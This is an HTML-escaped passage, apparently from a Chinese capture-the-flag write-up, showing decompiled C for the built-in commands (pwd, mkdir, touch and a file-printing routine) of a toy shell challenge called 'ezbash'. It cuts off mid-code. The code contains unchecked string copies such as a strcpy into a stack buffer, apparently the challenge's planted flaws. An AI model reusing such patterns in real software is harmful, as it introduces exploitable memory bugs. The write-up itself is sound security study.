[rbp-59h]&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  &lt;span class=&#34;type&#34;&gt;int&lt;/span&gt; v7; &lt;span class=&#34;comment&#34;&gt;// [rsp+20h] [rbp-58h]&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  &lt;span class=&#34;type&#34;&gt;int&lt;/span&gt; num; &lt;span class=&#34;comment&#34;&gt;// [rsp+24h] [rbp-54h]&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  file *v9; &lt;span class=&#34;comment&#34;&gt;// [rsp+28h] [rbp-50h]&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  __int64 v10; &lt;span class=&#34;comment&#34;&gt;// [rsp+30h] [rbp-48h]&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  &lt;span class=&#34;type&#34;&gt;char&lt;/span&gt; *dest; &lt;span class=&#34;comment&#34;&gt;// [rsp+38h] [rbp-40h]&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  &lt;span class=&#34;type&#34;&gt;unsigned&lt;/span&gt; __int64 v12; &lt;span class=&#34;comment&#34;&gt;// [rsp+40h] [rbp-38h]&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  comment = cmd;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  v12 = __readfsqword(&lt;span class=&#34;number&#34;&gt;0x28&lt;/span&gt;u);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  num = &lt;span class=&#34;number&#34;&gt;0&lt;/span&gt;;                                      &lt;span class=&#34;comment&#34;&gt;// 参数的数目&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  v6 = &lt;span class=&#34;number&#34;&gt;0&lt;/span&gt;;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  v7 = &lt;span class=&#34;number&#34;&gt;0&lt;/span&gt;;                                       &lt;span class=&#34;comment&#34;&gt;// v7 最大参数的长度&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  v9 = &lt;span class=&#34;number&#34;&gt;0LL&lt;/span&gt;;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  &lt;span class=&#34;keyword&#34;&gt;while&lt;/span&gt; ( comment[++num] )&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  &amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &lt;span class=&#34;keyword&#34;&gt;if&lt;/span&gt; ( &lt;span class=&#34;built_in&#34;&gt;strlen&lt;/span&gt;(comment[num]) &amp;gt; v7 )&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;      v7 = &lt;span class=&#34;built_in&#34;&gt;strlen&lt;/span&gt;(comment[num]) + &lt;span class=&#34;number&#34;&gt;1&lt;/span&gt;;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  &amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  v10 = v7 - &lt;span class=&#34;number&#34;&gt;1LL&lt;/span&gt;;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  v1 = &lt;span class=&#34;number&#34;&gt;16&lt;/span&gt; * ((v7 + &lt;span class=&#34;number&#34;&gt;15LL&lt;/span&gt;) / &lt;span class=&#34;number&#34;&gt;0x10&lt;/span&gt;uLL);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  &lt;span class=&#34;keyword&#34;&gt;while&lt;/span&gt; ( v4 != &amp;amp;v4[-(v1 &amp;amp; &lt;span class=&#34;number&#34;&gt;0xFFFFFFFFFFFFF000&lt;/span&gt;LL)] )&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    ;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  v2 = alloca(v1 &amp;amp; &lt;span class=&#34;number&#34;&gt;0xFFF&lt;/span&gt;);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  &lt;span class=&#34;keyword&#34;&gt;if&lt;/span&gt; ( (v1 &amp;amp; &lt;span class=&#34;number&#34;&gt;0xFFF&lt;/span&gt;) != &lt;span class=&#34;number&#34;&gt;0&lt;/span&gt; )&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    *&amp;amp;v4[(v1 &amp;amp; &lt;span class=&#34;number&#34;&gt;0xFFF&lt;/span&gt;) - &lt;span class=&#34;number&#34;&gt;8&lt;/span&gt;] = *&amp;amp;v4[(v1 &amp;amp; &lt;span class=&#34;number&#34;&gt;0xFFF&lt;/span&gt;) - &lt;span class=&#34;number&#34;&gt;8&lt;/span&gt;];&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  dest = v4;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  num = &lt;span class=&#34;number&#34;&gt;1&lt;/span&gt;;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  &lt;span class=&#34;keyword&#34;&gt;if&lt;/span&gt; ( !comment[&lt;span class=&#34;number&#34;&gt;1&lt;/span&gt;] )&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    fwrite(&lt;span class=&#34;string&#34;&gt;&amp;quot;ezbash: missing operand\n&amp;quot;&lt;/span&gt;, &lt;span class=&#34;number&#34;&gt;1uLL&lt;/span&gt;, &lt;span class=&#34;number&#34;&gt;0x18&lt;/span&gt;uLL, &lt;span class=&#34;built_in&#34;&gt;stderr&lt;/span&gt;);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  &lt;span class=&#34;keyword&#34;&gt;while&lt;/span&gt; ( comment[num] )&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  &amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    v9 = cuurr_pos-&amp;gt;firstson;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &lt;span class=&#34;built_in&#34;&gt;strcpy&lt;/span&gt;(dest, comment[num]);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &lt;span class=&#34;keyword&#34;&gt;while&lt;/span&gt; ( v9 )&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;      &lt;span class=&#34;keyword&#34;&gt;if&lt;/span&gt; ( !&lt;span class=&#34;built_in&#34;&gt;strcmp&lt;/span&gt;(dest, v9-&amp;gt;name) )&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;      &amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        &lt;span class=&#34;keyword&#34;&gt;if&lt;/span&gt; ( v9-&amp;gt;context )&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;          &lt;span class=&#34;built_in&#34;&gt;puts&lt;/span&gt;(v9-&amp;gt;context);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        v6 = &lt;span class=&#34;number&#34;&gt;1&lt;/span&gt;;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        &lt;span class=&#34;keyword&#34;&gt;break&lt;/span&gt;;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;      &amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;      v9 = v9-&amp;gt;next_bro;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &lt;span class=&#34;keyword&#34;&gt;if&lt;/span&gt; ( v6 != &lt;span class=&#34;number&#34;&gt;1&lt;/span&gt; )&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;      &lt;span class=&#34;built_in&#34;&gt;fprintf&lt;/span&gt;(&lt;span class=&#34;built_in&#34;&gt;stderr&lt;/span&gt;, &lt;span class=&#34;string&#34;&gt;&amp;quot;ezbash: %s: No such file or directory\n&amp;quot;&lt;/span&gt;, comment[num]);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    ++num;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  &amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  &lt;span class=&#34;keyword&#34;&gt;return&lt;/span&gt; &lt;span class=&#34;number&#34;&gt;1LL&lt;/span&gt;;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&amp;#125;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;h4 id=&#34;pwd&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#pwd&#34;&gt;#&lt;/a&gt; pwd&lt;/h4&gt;
&lt;p&gt;仅仅只是输出当前的路径&lt;/p&gt;
&lt;figure class=&#34;highlight c&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;__int64 &lt;span class=&#34;title function_&#34;&gt;apwd&lt;/span&gt;&lt;span class=&#34;params&#34;&gt;()&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  &lt;span class=&#34;built_in&#34;&gt;puts&lt;/span&gt;(cur_position_addr);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  &lt;span class=&#34;keyword&#34;&gt;return&lt;/span&gt; &lt;span class=&#34;number&#34;&gt;1LL&lt;/span&gt;;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&amp;#125;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;h4 id=&#34;exithelp&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#exithelp&#34;&gt;#&lt;/a&gt; exit,help&lt;/h4&gt;
&lt;p&gt;没什么可以说的。&lt;/p&gt;
&lt;h4 id=&#34;mkdir&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#mkdir&#34;&gt;#&lt;/a&gt; mkdir&lt;/h4&gt;
&lt;p&gt;在当前的目录下创建一个字目录，并把她 link 进 firstson 的链表，采用的是头插法。&lt;/p&gt;
&lt;figure class=&#34;highlight c&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;7&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;8&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;9&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;10&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;11&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;12&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;13&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;14&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;15&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;16&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;17&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;18&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;19&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;20&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;21&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;22&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;23&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;24&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;25&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;26&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;27&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;28&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;29&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;30&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;31&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;32&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;33&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;34&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;35&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;36&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;37&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;38&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;39&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;40&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;41&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;42&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;43&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;44&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;45&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;46&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;__int64 __fastcall &lt;span class=&#34;title function_&#34;&gt;amkdir&lt;/span&gt;&lt;span class=&#34;params&#34;&gt;(&lt;span class=&#34;type&#34;&gt;char&lt;/span&gt; **cmd)&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  &lt;span class=&#34;type&#34;&gt;char&lt;/span&gt; v1; &lt;span class=&#34;comment&#34;&gt;// al&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  &lt;span class=&#34;type&#34;&gt;char&lt;/span&gt; v3[&lt;span class=&#34;number&#34;&gt;2&lt;/span&gt;]; &lt;span class=&#34;comment&#34;&gt;// [rsp+1Ah] [rbp-16h] BYREF&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  &lt;span class=&#34;type&#34;&gt;int&lt;/span&gt; v4; &lt;span class=&#34;comment&#34;&gt;// [rsp+1Ch] [rbp-14h]&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  file *first_son; &lt;span class=&#34;comment&#34;&gt;// [rsp+20h] [rbp-10h]&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  file *newfile; &lt;span class=&#34;comment&#34;&gt;// [rsp+28h] [rbp-8h]&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  v4 = &lt;span class=&#34;number&#34;&gt;1&lt;/span&gt;;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  qmemcpy(v3, &lt;span class=&#34;string&#34;&gt;&amp;quot;./&amp;quot;&lt;/span&gt;, &lt;span class=&#34;keyword&#34;&gt;sizeof&lt;/span&gt;(v3));&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  &lt;span class=&#34;keyword&#34;&gt;if&lt;/span&gt; ( !cmd[&lt;span class=&#34;number&#34;&gt;1&lt;/span&gt;] )&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    fwrite(&lt;span class=&#34;string&#34;&gt;&amp;quot;ezbash: missing operand\n&amp;quot;&lt;/span&gt;, &lt;span class=&#34;number&#34;&gt;1uLL&lt;/span&gt;, &lt;span class=&#34;number&#34;&gt;0x18&lt;/span&gt;uLL, &lt;span class=&#34;built_in&#34;&gt;stderr&lt;/span&gt;);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  &lt;span class=&#34;keyword&#34;&gt;while&lt;/span&gt; ( cmd[v4] )&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  &amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    first_son = cuurr_pos-&amp;gt;firstson;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &lt;span class=&#34;keyword&#34;&gt;if&lt;/span&gt; ( &lt;span class=&#34;built_in&#34;&gt;strchr&lt;/span&gt;(cmd[v4], v3[&lt;span class=&#34;number&#34;&gt;0&lt;/span&gt;]) )&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;      ++v4;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &lt;span class=&#34;keyword&#34;&gt;else&lt;/span&gt; &lt;span class=&#34;keyword&#34;&gt;if&lt;/span&gt; ( &lt;span class=&#34;built_in&#34;&gt;strchr&lt;/span&gt;(cmd[v4], v3[&lt;span class=&#34;number&#34;&gt;1&lt;/span&gt;]) )&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;      ++v4;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &lt;span class=&#34;keyword&#34;&gt;else&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;      ((&amp;amp;check_error + &lt;span class=&#34;number&#34;&gt;1&lt;/span&gt;))();&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;      &lt;span class=&#34;keyword&#34;&gt;if&lt;/span&gt; ( v1 != &lt;span class=&#34;number&#34;&gt;1&lt;/span&gt; )&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;      &amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        &lt;span class=&#34;built_in&#34;&gt;fprintf&lt;/span&gt;(&lt;span class=&#34;built_in&#34;&gt;stderr&lt;/span&gt;, aEzbashCannotCr, cmd[v4++]);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;      &amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;      &lt;span class=&#34;keyword&#34;&gt;else&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;      &amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        newfile = calloc40();&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        newfile-&amp;gt;flag = &lt;span class=&#34;number&#34;&gt;0&lt;/span&gt;;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        newfile-&amp;gt;futher = cuurr_pos;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        copy_name(newfile, cmd[v4]);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        &lt;span class=&#34;keyword&#34;&gt;if&lt;/span&gt; ( cuurr_pos-&amp;gt;firstson )&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;          link(first_son, newfile);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        &lt;span class=&#34;keyword&#34;&gt;else&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;          cuurr_pos-&amp;gt;firstson = newfile;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        ++v4;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;      &amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  &amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  &lt;span class=&#34;keyword&#34;&gt;return&lt;/span&gt; &lt;span class=&#34;number&#34;&gt;1LL&lt;/span&gt;;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&amp;#125;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;h4 id=&#34;touch&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#touch&#34;&gt;#&lt;/a&gt; touch&lt;/h4&gt;
&lt;p&gt;创建一个空文件，与 mkdir 的操作类似&lt;/p&gt;
&lt;figure class=&#34;highlight c&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;7&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;8&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;9&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;10&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;11&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;12&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;13&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;14&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;15&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;16&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;17&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;18&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;19&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;20&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;21&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;22&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;23&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;24&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;25&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;26&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;27&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;28&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;29&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;30&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;31&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;32&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;33&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;34&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;35&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;36&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;37&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;38&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;39&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;40&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;41&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;42&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;43&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;44&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;45&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;__int64 __fastcall &lt;span class=&#34;title function_&#34;&gt;atouch&lt;/span&gt;&lt;span class=&#34;params&#34;&gt;(&lt;span class=&#34;type&#34;&gt;char&lt;/span&gt; **cmd)&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  &lt;span class=&#34;type&#34;&gt;char&lt;/span&gt; v1; &lt;span class=&#34;comment&#34;&gt;// al&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  &lt;span class=&#34;type&#34;&gt;char&lt;/span&gt; v3[&lt;span class=&#34;number&#34;&gt;2&lt;/span&gt;]; &lt;span class=&#34;comment&#34;&gt;// [rsp+1Ah] [rbp-16h] BYREF&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  &lt;span class=&#34;type&#34;&gt;int&lt;/span&gt; v4; &lt;span class=&#34;comment&#34;&gt;// [rsp+1Ch] [rbp-14h]&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  file *v5; &lt;span class=&#34;comment&#34;&gt;// [rsp+20h] [rbp-10h]&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  file *v6; &lt;span class=&#34;comment&#34;&gt;// [rsp+28h] [rbp-8h]&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  v4 = &lt;span class=&#34;number&#34;&gt;1&lt;/span&gt;;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  qmemcpy(v3, &lt;span class=&#34;string&#34;&gt;&amp;quot;./&amp;quot;&lt;/span&gt;, &lt;span class=&#34;keyword&#34;&gt;sizeof&lt;/span&gt;(v3));&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  &lt;span class=&#34;keyword&#34;&gt;if&lt;/span&gt; ( !cmd[&lt;span class=&#34;number&#34;&gt;1&lt;/span&gt;] )&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    fwrite(&lt;span class=&#34;string&#34;&gt;&amp;quot;ezbash: missing operand\n&amp;quot;&lt;/span&gt;, &lt;span class=&#34;number&#34;&gt;1uLL&lt;/span&gt;, &lt;span class=&#34;number&#34;&gt;0x18&lt;/span&gt;uLL, &lt;span class=&#34;built_in&#34;&gt;stderr&lt;/span&gt;);&lt;/span&gt;&lt;br&gt;&lt;span 